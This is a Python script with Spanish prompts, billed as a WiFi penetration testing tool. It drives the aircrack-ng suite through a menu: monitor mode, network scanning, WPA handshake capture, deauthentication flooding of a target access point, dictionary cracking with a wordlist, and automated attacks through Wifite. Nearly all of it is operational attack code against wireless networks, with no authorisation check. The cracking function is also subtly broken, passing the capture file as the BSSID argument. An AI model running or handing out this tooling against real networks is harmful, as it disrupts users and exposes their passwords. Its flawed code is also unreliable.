#!/usr/bin/env python3
import subprocess
import os
import time
import sys

def check_root():
    if os.geteuid() != 0:
        print("[!] Ejecuta este script como root (sudo).")
        sys.exit(1)

def show_interfaces():
    print("\nInterfaces de red WiFi detectadas:")
    result = subprocess.run(['iwconfig'], capture_output=True, text=True)
    print(result.stdout)

def enable_monitor_mode(interface):
    print(f"\n[+] Habilitando modo monitor en {interface}...")
    subprocess.run(['ifconfig', interface, 'down'])
    subprocess.run(['airmon-ng', 'check', 'kill'])
    subprocess.run(['airmon-ng', 'start', interface])
    print("[+] Modo monitor habilitado.")
    return interface + "mon"  # por lo general añade 'mon' al nombre

def disable_monitor_mode(mon_interface):
    print(f"\n[+] Deshabilitando modo monitor en {mon_interface}...")
    subprocess.run(['airmon-ng', 'stop', mon_interface])
    subprocess.run(['service', 'NetworkManager', 'start'])
    print("[+] Modo monitor deshabilitado.")

def scan_networks(mon_interface):
    print("\n[+] Escaneando redes WiFi cercanas con airodump-ng (Ctrl+C para detener)...")
    try:
        subprocess.run(['airodump-ng', mon_interface])
    except KeyboardInterrupt:
        print("\n[+] Escaneo detenido.")

def capture_handshake(mon_interface, target_bssid, channel, output_file):
    print(f"\n[+] Capturando handshake para BSSID {target_bssid} en canal {channel}")
    print("[!] En otra terminal, puedes lanzar el ataque de desautenticación para acelerar captura.")
    print("[!] Presiona Ctrl+C para detener la captura.")

    # Ejecutar airodump-ng para capturar handshake
    try:
        subprocess.run([
            'airodump-ng',
            '--bssid', target_bssid,
            '-c', channel,
            '-w', output_file,
            mon_interface
        ])
    except KeyboardInterrupt:
        print("\n[+] Captura finalizada.")

def deauth_attack(mon_interface, target_bssid):
    print(f"\n[+] Realizando ataque de desautenticación a {target_bssid} (Ctrl+C para detener)...")
    try:
        subprocess.run([
            'aireplay-ng',
            '--deauth', '10',  # número de paquetes de desautenticación, puede cambiarse
            '-a', target_bssid,
            mon_interface
        ])
    except KeyboardInterrupt:
        print("\n[+] Ataque detenido.")

def crack_handshake(capture_file, wordlist):
    print(f"\n[+] Iniciando ataque de diccionario con aircrack-ng sobre {capture_file} usando {wordlist}...")
    try:
        subprocess.run([
            'aircrack-ng',
            '-w', wordlist,
            '-b', capture_file,
        ])
    except KeyboardInterrupt:
        print("\n[+] Ataque detenido.")

def wifite_run():
    print("\n[+] Ejecutando Wifite para ataque automático (Ctrl+C para salir)...")
    try:
        subprocess.run(['wifite'])
    except KeyboardInterrupt:
        print("\n[+] Wifite detenido.")

def main():
    check_root()
    print("""
====================================
   WIFI PENETRATION TESTING TOOL
====================================
    """)
    show_interfaces()
    
    interface = input("Introduce la interfaz WiFi para modo monitor (ej. wlan0): ").strip()
    mon_interface = enable_monitor_mode(interface)
    
    while True:
        print("""
--- MENÚ ---
1. Escanear redes WiFi (airodump-ng)
2. Capturar handshake
3. Realizar ataque de desautenticación
4. Ataque de diccionario (aircrack-ng)
5. Ejecutar Wifite (ataque automatizado)
6. Salir
""")
        choice = input("Selecciona opción: ").strip()

        if choice == '1':
            scan_networks(mon_interface)
        elif choice == '2':
            bssid = input("Introduce BSSID (MAC de la red objetivo): ").strip()
            channel = input("Introduce canal de la red objetivo: ").strip()
            output = input("Nombre base para archivo de captura (ej. handshake): ").strip()
            capture_handshake(mon_interface, bssid, channel, output)
        elif choice == '3':
            bssid = input("Introduce BSSID (MAC de la red objetivo): ").strip()
            deauth_attack(mon_interface, bssid)
        elif choice == '4':
            cap_file = input("Ruta del archivo .cap o .pcap con handshake: ").strip()
            wordlist = input("Ruta del diccionario de contraseñas (ej. /usr/share/wordlists/rockyou.txt): ").strip()
            crack_handshake(cap_file, wordlist)
        elif choice == '5':
            wifite_run()
        elif choice == '6':
            disable_monitor_mode(mon_interface)
            print("Saliendo... ¡Gracias!")
            break
        else:
            print("Opción inválida. Intenta de nuevo.")

if __name__ == "__main__":
    main()
